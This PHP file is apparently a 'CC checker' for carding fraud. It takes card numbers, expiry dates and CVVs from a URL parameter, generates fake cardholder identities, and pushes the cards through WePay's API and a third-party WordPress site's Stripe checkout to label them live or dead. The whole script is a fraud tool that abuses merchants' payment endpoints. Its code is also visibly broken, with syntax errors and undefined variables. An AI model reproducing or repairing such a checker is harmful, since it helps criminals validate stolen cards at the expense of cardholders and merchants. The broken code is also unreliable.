<?php


include 'function.php';

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mon = multiexplode(array(":", "|", ""), $lista)[1];
$year = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

switch ($mon){
case '01':
$mon = '1';
break;
case '02':
$mon = '2';
break;
case '03':
$mon = '3';
break;
case '04':
$mon = '4';
break;
case '05':
$mon = '5';
break;
case '06':
$mon = '6';
break;
case '07':
$mon = '7';
break;
case '08':
$mon = '8';
break;
case '09':
$mon = '9';
break;
case '10':
$mon = '10';
break;
case '11':
$mon = '11';
break;
case '12':
$mon = '12';
break;
}


/////////////////////======================[1req Response]=====================////////////////////////
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."@gmail.com";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
}
elseif ($state == "WA"){
$zip = "98001";
}
elseif ($state == "AL"){
$zip = "35005";
}
elseif ($state == "FL"){
$zip = "32003";
}
else{
$zip = "90201";
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.wepayapi.com/v2/credit_card/create');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.wepayapi.com',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'origin: https://www.wepayapi.com',
'referer: https://www.wepayapi.com/api/messenger',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua.'',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"user_name":"'.$first.' '.$last.'","cc_number":"'.$cc.'","cvv":"'.$cvv.'","expiration_month":'.$mon.',"expiration_year":'.$year.',"address":{"postal_code":"'.$zip.'","country":"US"},"email":"'.$email.'","client_id":"<Jo bhi hoga daal lena and ye <> remove kr dena>"}');

// "client_id":"561096"}');
// Kuch aisa daalna

$result = curl_exec($ch);
$cid = string_between_two_string($result, '{"credit_card_id":', ',');
//////////////////////========================[2req Response]======================/////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://blueguitar.us/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array9
'authority:blueguitar.us,';
'Accept: application/json';
'Accept-Language: ',
'Connection: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary57BSfqBLhNBPl2A3',
'Origin: https://blueguitar.us',
'Referer: https://blueguitar.us/register/classroom-subscription/?action=checkout&txn=ex',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'));
'X-Requested-With: XMLHttpRequest'));

curl_setopt($ch, CURLOPT_POSTFIELDS,'type=card&billing_details[address][name]='.$name.'+' $last'billing_details[address][city]=NEW+YORK&billing_details[address][country]=US&billing_details[address][state]=NY&billing_details[address][postal_code]=10080&billing_details[name]=.'$name.'+' $last'card[number]='.$cc.'card[cvc]='.$CVV.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.
'25&guid=a4277516-31a0-4b90-8fa7-adabfa769ffd66a185&muid=eaf93003-d4db-4af4-a477-685a302ef58b83898e&sid=7b8690f1-ed6e-4af7-8ce9-c23e9d056aca2a66c2&pasted_fields=number&payment_user_agent=stripe.js%2Fc1e00f41%3B+stripe-js-v3%2Fc1e00f41&time_on_page=79318&referrer=https%3A%2F%2Fblueguitar.us%2F&key=pk_live_7lYyexXLeO8LN4wEB6RtDUoJ006kVf4K0R'
$msg1 = string_between_two_string($result, '[', ']');
$msg = str_replace('"', '', $msg1);

//////////////////////================[Card Response Start]===================///////////////////

if (strpos($result, '2001')){
    echo '<span class="badge badge-warning">#Aprovada </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b></br> <span class="new badge badge-warning">Checker Made By ♛ yanesh ♛ </span></br></br>';
}
elseif (strpos($result, 'Unable to charge payment method')){
    echo '<span class="badge badge-warning">#Aprovada </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ Authorized CVV ★ 』 </span> </b></br> <span class="new badge badge-warning">Checker Made By ♛ yagnesh ♛</span></br></br>';
}
elseif (strpos($result, '2008')){
    echo '<span class="badge badge-warning">#Aprovada </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ LIVE CCN ★ 』 </span> </b></br> <span class="new badge badge-warning">Checker Made By ♛ yagnesh ♛</span></br></br>';
}
elseif (!$result){
    echo '<span class="badge badge-warning">#Reprovadas </span></br> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">  『 ★ Unknown Error ★ 』 </span> </b></br> <span class="new badge badge-warning">Checker Made By ♛ yagnesh ♛</span></br></br>';
}
else{
    echo '<span class="badge badge-warning">#Reprovadas </span></br> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">  『 ★ '.$msg.' ★ 』 </span> </b></br> <span class="new badge badge-warning">Checker Made By ♛ yagnesh ♛</span></br></br>';
}
curl_close($ch);
ob_flush();
?>